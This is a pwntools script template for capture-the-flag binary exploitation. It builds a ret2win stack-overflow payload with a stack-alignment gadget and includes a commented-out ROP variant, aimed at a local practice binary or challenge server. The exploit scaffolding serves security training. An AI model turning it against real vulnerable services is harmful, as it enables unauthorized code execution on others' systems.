#!/usr/bin/env python3
"""
Pwntools template for binary exploitation challenges.
Usage:
    python3 solve.py               # Runs locally against target binary
    python3 solve.py REMOTE        # Connects to remote challenge server
    python3 solve.py GDB           # Spawns binary with GDB attached
"""

from pwn import *

# Configuration
exe = './vuln'
host = '127.0.0.1'
port = 1337

elf = context.binary = ELF(exe, checksec=False)
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote(host, port)
    elif args.GDB:
        gdbscript = '''
        init-pwndbg
        break main
        continue
        '''
        return gdb.debug([exe], gdbscript=gdbscript)
    else:
        return process([exe])

io = start()

# Offset calculation
# Generate pattern: cyclic 100
# Find offset: cyclic -l <fault_address>
offset = 40

# Exploit construction

# Scenario 1: ret2win
win_addr = elf.symbols['win']
log.info(f"Target address: {hex(win_addr)}")

# In 64-bit binaries on GLIBC 2.27+, system() requires a 16-byte aligned stack.
# Insert a single ret instruction before the call if the program crashes in system().
ret_gadget = (elf.search(asm('ret'))).__next__()

payload = flat({
    offset: [
        ret_gadget,   # Stack alignment for 64-bit system calls
        win_addr
    ]
})

# Scenario 2: Function with arguments in 64-bit (RDI, RSI, RDX)
# rop = ROP(elf)
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# payload = flat({
#     offset: [
#         pop_rdi,
#         0xdeadbeef,
#         win_addr
#     ]
# })

# Send payload
io.sendlineafter(b':', payload)
io.interactive()
